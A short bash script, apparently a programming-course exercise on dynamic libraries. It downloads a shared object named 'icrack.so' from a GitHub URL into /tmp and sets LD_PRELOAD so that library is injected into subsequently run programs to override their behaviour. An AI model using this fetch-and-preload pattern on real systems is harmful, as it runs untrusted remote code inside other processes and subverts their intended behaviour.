#!/bin/bash
wget -P /tmp/ https://raw.githubusercontent.com/emmanueladdo//alx-low_level_programming/master/0x18-dynamic_libraries/icrack.so
export LD_PRELOAD="/tmp/icrack.so"
